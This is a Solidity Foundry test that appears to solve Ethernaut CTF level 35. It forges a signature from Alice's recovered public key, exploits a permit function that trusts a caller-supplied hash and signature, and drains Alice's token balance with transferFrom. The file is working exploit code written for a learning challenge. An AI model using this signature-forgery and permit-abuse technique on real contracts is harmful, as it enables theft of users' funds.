// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level35 {
    function permit(uint256, address, bytes memory, bytes memory) external;
    function transferFrom(address, address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract Level35Test is EthernautTest {
    function testLevel35() public {
        _createLevel("35");

        Level35 level35Instance = Level35(levelInstance["35"]);

        // We can use pretty much any hash and corresponding signature from the Alice
        // address to create a permit of near unlimited tokens to us from Alice.

        // Any valid signature and hash pair for Alice's address will work here apart from
        // the one corresponding to the voucher hash redemption.

        // The key point of this level is that the permit function allows you to set
        // the hash and signature which is used to recover the tokenOwner address. This
        // means you can just construct a signature and hash to that effect using Alice's
        // public key.

        // Here is one such signature I generated using level35.sh
        // The corresponding rust code is in /level35 folder.
        // Generating the instance and viewing the logs gives the hash and signature
        // used in Alice's redeem transaction, which allows recovery of the uncompressed
        // public key. That is used in that script to generate a new valid signature.

        uint256 hash = 0x2a62ea498d503198512d44d9a34ba207308a139e58e90205b6a23b262e60b7f1;
        bytes memory signature =
            hex"f4d7062a95bcf664f1b3b5760ec52371ac2412a1dee92fa4eff1e32c30af445d117ad26cd0f5ffe09a93e3643219ab3579d6eb7f1008e0d2bab0c86704f48eab1b";
        address a11ce = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;
        uint8 v;
        bytes32 r;
        bytes32 s;
        assembly {
            // first 32 bytes after the length prefix
            r := mload(add(signature, 0x20))
            // next 32 bytes
            s := mload(add(signature, 0x40))
            // final byte (first byte of the next 32-byte word)
            v := byte(0, mload(add(signature, 0x60)))
        }
        require(a11ce == ecrecover(bytes32(hash), v, r, s));

        // Lets generate a random EOA for us to use to receive Alice's approval.
        (address charlie, uint256 charlieKey) = makeAddrAndKey("charlie");

        // We need to recreate the permitAcceptHash used in permit.
        bytes32 permitAcceptHash = keccak256(abi.encodePacked(a11ce, charlie, hash));

        {
            // Now we need to sign the permitAcceptHash as Charlie.
            (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(charlieKey, permitAcceptHash);

            // Then we can call permit.
            level35Instance.permit(hash, charlie, signature, abi.encodePacked(r2, s2, v2));
        }

        // We can imagine we now call the function from that EOA we generated.
        vm.startPrank(charlie);
        level35Instance.transferFrom(a11ce, address(this), level35Instance.balanceOf(a11ce));
        vm.stopPrank();

        require(_submitLevel("35"));
    }
}
